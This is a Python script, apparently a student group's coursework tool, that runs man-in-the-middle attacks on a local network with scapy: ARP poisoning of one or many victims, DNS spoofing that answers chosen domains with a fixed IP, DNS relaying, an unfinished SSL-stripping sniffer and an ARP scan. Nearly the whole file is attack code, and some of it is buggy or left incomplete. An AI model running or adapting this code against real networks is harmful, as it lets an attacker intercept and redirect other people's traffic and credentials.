import sys, os, argparse
from util import bcolors, clear, parse_ip_input, validate_domain
import random
from scapy.all import *
from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip, send, sniff, TCP, Raw
import time
import threading
import re
import urllib
from functools import partial
from mitmproxy import controller, proxy, options


# The name of the network interface to use for sniffing and sending packets
interval = 4
RUNINGTHREAD = False
# Set the interface to listen and respond on
net_interface = "enp0s8"
INTERFACE_NAME = "enp0s3"
ATTACKS = {
    "a": "ARP poisoning",
    "b": "DNS spoofing",
    "c": "SSL stripping",
    "d": "Address Mapping",
}

IP_ATTACKER = ""
MAC_ATTACKER = ""
IP_VICTIMS = []
MAC_VICTIMS = []


# Python 2.7... :(
try:
    input = raw_input
except NameError:
    pass


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog="2IC80 tool",
    description="A tool for ARP poising, DNS spoofing and SSL stripping.",
    epilog="There are no arguments, please use the menu provided when running the tool. Good luck!",
)


def spoof(target_ip, spoof_ip):
    packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    print(getmacbyip(target_ip))
    send(packet, verbose=False)


def ARPposioning():
    IP_ATTACKER = input("Enter IP address of attacker: ")
    MAC_ATTACKER = getmacbyip(IP_ATTACKER)

    victimNumber = input("Do you want to spoof one or multiple victims? (1/m)")
    if victimNumber == "1":
        ipVictim = input("Enter IP address of victim: ")
        macVictim = getmacbyip(ipVictim)

        IP_VICTIMS.append(ipVictim)
        MAC_VICTIMS.append(macVictim)

        ipToSpoof = input("Enter IP address to spoof: ")
        print(ipVictim)
        spoof(ipVictim, ipToSpoof)

        print("\n\n")

    elif victimNumber == "m":
        IPrange = input("What is the range of IP addresses?")
        IpToSpoof = input("What is the IP address to spoof?")
        if "-" in IPrange:
            upperBoundary = IPrange.split("-")[1]
            lowerBoundary = lowerBoundary = IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary)):
                ipVictim = (
                    IPrange.split(".")[0]
                    + "."
                    + IPrange.split(".")[1]
                    + "."
                    + IPrange.split(".")[2]
                    + "."
                    + str(i)
                )
                macVictim = getmacbyip(ipVictim)

                IP_VICTIMS.append(ipVictim)
                MAC_VICTIMS.append(macVictim)

                print(ipVictim)
                arp = Ether() / ARP()
                arp[Ether].src = MAC_ATTACKER
                arp[ARP].hwsrc = MAC_ATTACKER
                arp[ARP].psrc = ipToSpoof
                arp[ARP].hwdst = macVictim
                arp[ARP].pdst = ipVictim
        else:
            print("Invalid input. Please try again.")

        print("\n\n")

    print(
        "{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n".format(
            cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
        )
    )


def DNSpoisoning():
    dns_ip = ""
    dns_domain = ""

    # DNS poisoning requires impersonating the router

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = input("Enter the domain name to spoof: ")
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print(
                "{warning}Please enter a valid domain (format: www.example.com){endc}".format(
                    warning=bcolors.WARNING, endc=bcolors.ENDC
                )
            )
    print(dns_domain)
    ipVictim = raw_input("Enter the IP of the victim u chose")
    ipGate = raw_input("Enter the IP of the Gateway (probably 10.0.2.1)")
    spoof(ipGate, ipVictim)
    spoof(ipVictim, ipGate)
    RUNINGTHREAD = True
    x = threading.Thread(
        target=sniffing, args=(dns_domain, ipVictim, ipGate, RUNINGTHREAD)
    )
    x.daemon = True
    x.start()

    # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
    # The data below is assumed from that ARP poisoning attack
    # Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply

    # print(
    #     "\n{cyan}{attack}{endc} has been executed (sent a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc})\n".format(
    #         cyan=bcolors.OKCYAN,
    #         attack=ATTACKS["b"],
    #         endc=bcolors.ENDC,
    #         domain=dns_domain,
    #         ip=dns_ip,
    #     )
    # )


def sniffing(dns_domain, ipVictim, ipGate, RUNINGTHREAD):
    while True:
        if RUNINGTHREAD == False:
            break
        sniff(
            filter="udp port 53",
            prn=partial(
                dns_reply, dns_dom=dns_domain, ipVictim=ipVictim, ipGate=ipGate
            ),
            store=0,
            iface=net_interface,
            count=1,
        )


def dns_reply(packet, dns_dom, ipVictim, ipGate):
    print(packet[DNSQR].qname, dns_dom)
    if packet[DNSQR].qname == dns_dom + "." and packet[IP].src == ipVictim:
        print(1)
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

        # Construct the IP header by looking at the sniffed packet
        ip = IP(src=packet[IP].dst, dst=packet[IP].src)

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

        # Construct the DNS response by looking at the sniffed packet and manually

        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=packet[DNS].qd.qname, type="A", ttl=600, rdata="192.168.56.102"
            ),
        )

        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        sendp(response_packet, iface=net_interface)

        # forward the packet to the gateway (unimplemented)


def dns_forwarding():
    """
    Function for sniffing DNS requests and responses and calling the callback.
    """
    print('Now sniffing for DNS requests and responses...')

    ip_gateway = '10.0.2.1'
    mac_gateway = '52:54:00:12:35:00'

    # Sniff for DNS requests and responses and pass ip_gateway
    sniff(filter="udp port 53", prn=partial(dns_forwarding_callback, ip_gateway=ip_gateway, mac_gateway=mac_gateway), store=0, iface=net_interface, count=1)


def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
    """
    Callback function in DNS forwarding sniff, forwarding DNS requests to the gateway and DNS responses
    to the victim.
    """
    ip_victim = '10.0.2.4'
    ip_attacker = '10.0.2.5'
    mac_victim = '08:00:27:09:75:00'
    mac_attacker = '08:00:27:0b:33:f8'
    print('Sniffed a DNS packet. IP/MAC gateway: {ip_gateway}/{mac_gateway}'.format(ip_gateway=ip_gateway, mac_gateway=mac_gateway))

    is_dns_request = packet.haslayer(IP) and packet[IP].src == '10.0.2.4' and packet.haslayer(DNS) and packet[DNS].qr == 0
    is_dns_response = packet.haslayer(IP) and packet[IP].src == '10.0.2.1' and packet.haslayer(DNS) and packet[DNS].qr == 1

    # Forward DNS requests to the gateway. Source should be the attacker, destination should be the gateway
    if is_dns_request:
        print('Sniffed DNS packet is a DNS request')
        eth = Ether(src=mac_attacker, dst=mac_gateway)
        ip = IP(src=ip_attacker, dst=ip_gateway)
        udp = UDP(sport=53, dport=53)
        dns = packet[DNS]
        
        dns_request = eth / ip / udp / dns
    
        print(dns_request.summary())
        
        sendp(dns_request, iface=net_interface)

    # Forward DNS responses to the victim
    if is_dns_response:
        print('Sniffed DNS packet is a DNS response')
        eth = Ether(src=mac_gateway, dst=mac_victim)
        ip = IP(src=ip_gateway, dst=ip_victim)
        udp = UDP(sport=53, dport=53)
        dns = packet[DNS]

        dns_response = eth / ip / udp / dns

        sendp(dns_response, iface=net_interface)
    

def SSLstripping():
    """
    Function for executing the SSL stripping attack.

    Assumes ARP poisoning has been executed. That means we're spoofing the gateway, so in order to allow
    the victim to connect to the internet, we need to forward the DNS requests to the gateway.
    """
    # Update: lulw
    # Basically, we have a setting to toggle IP forwarding. We don't spoof or do anything with the DNS requests, so just let them go to the server
    # "Just letting them go" means to set the packets to return to the victim, not us as the attacker. The ipv4 forward setting will automatically forward
    # the responses of these packets, while we're still a MITM impersonating the gateway according to the victim. We can then do the sniffing as normal.
    dns_forwarding_thread = threading.Thread(target=dns_forwarding)
    dns_forwarding_thread.daemon = True
    dns_forwarding_thread.start()

    # Run the proxy in a new thread
    # proxy_thread = threading.Thread(target=run_proxy, args=("localhost", 8080))
    # proxy_thread.daemon = True
    # proxy_thread.start()

    # # Run the IPTABLES command to redirect traffic to the proxy
    # os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")

    # Run the SSL stripping attack using Scapy only instead of using MITMProxy, IPTABLES and the SSLStrip tool. Build it from scratch.
    # Concept:
    # 1. Sniff for HTTP requests
    # 2. When received, modify the request headers and forward the request to the server
    # 3. Sniff for HTTP responses
    # 4. When received, modify the response headers, strip the links and secure tags in the response body and forward the response to the client

    # Set of SSL/TLS capable hosts
    secure_hosts = set()

    # Transform the request and response functions above into Scapy code
    def request(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
            print(packet[TCP].payload)
        
    def response(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
            print(packet[TCP].payload)
    
    # Sniff for HTTP requests in a new thread
    ssl_strip_thread = threading.Thread(target=ssl_strip_sniffing, args=(request, response))
    ssl_strip_thread.daemon = True
    ssl_strip_thread.start()

    print("\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
        cyan=bcolors.OKCYAN,
        attack=ATTACKS["c"],
        endc=bcolors.ENDC,
    ))

def ssl_strip_sniffing(request, response):
    sniff(filter="tcp port 80", prn=request, store=0, iface=net_interface, count=1)

class RequestLogger():
    def request(self, flow):
        print(flow.request)

def run_proxy(host, port):
    # Start an MITM proxy server + master in Python 2.7 (mitmproxy version 0.18.2)
    # Make sure to set the proxy as transparent
    # https://docs.mitmproxy.org/stable/howto-transparent/
    opts = options.Options(mode="transparent")
    c = proxy.config.ProxyConfig(opts)
    s = proxy.server.ProxyServer(config=c)
    m = controller.Master(opts, s)
    
    try:
        m.run()
    except KeyboardInterrupt:
        m.shutdown()

    # Set of SSL/TLS capable hosts
    # secure_hosts = set()

     


def scan_ip(network, iface):
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    arp_request_broadcast = broadcast / arp_request  # Combined Packet

    answered = srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]

    # Print the IP and MAC addresses of all the devices on the network.
    print(
        "\033[1m"
        + "  Here are the active devices on the "
        + iface
        + " interface"
        + "\033[0m"
    )
    for sent, received in answered:
        print("  IP: " + received.psrc + " - MAC: " + received.hwsrc)
    print("\n")


def mapAddresses():
    print(
        "  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n"
    )
    scan_ip("10.0.2.0/24", "enp0s8")
    scan_ip("192.168.56.1/24", "enp0s3")


def stopSniffing():
    global RUNINGTHREAD
    RUNINGTHREAD = False


def main():
    clear()
    print("2IC80: Tool by G44")
    while True:
        print("Select the preferred attack from the list below:\n")

        print(
            "    {cyan}a{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}b{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["b"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}c{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["c"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}d{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["d"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC)
        )

        choice = input("\nYour choice: " + bcolors.OKCYAN)
        print(bcolors.ENDC + "\n")
        selectedName = choice
        if choice in ATTACKS:
            selectedName = ATTACKS[choice]
            stopSniffing()
        elif choice == "e":
            selectedName = "Exit"
            stopSniffing()
        print(
            "You have selected {cyan}{name}{endc}. \n".format(
                cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC
            )
        )

        if choice == "e":
            # Remove potential IP tables redirect
            try:
                os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
            except:
                pass
            break
        elif choice == "a":
            ARPposioning()
        elif choice == "b":
            DNSpoisoning()
        elif choice == "c":
            SSLstripping()
        elif choice == "d":
            mapAddresses()
        else:
            print("Invalid input. Please try again.\n")


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == "__main__":
    parser.parse_args()
    main()
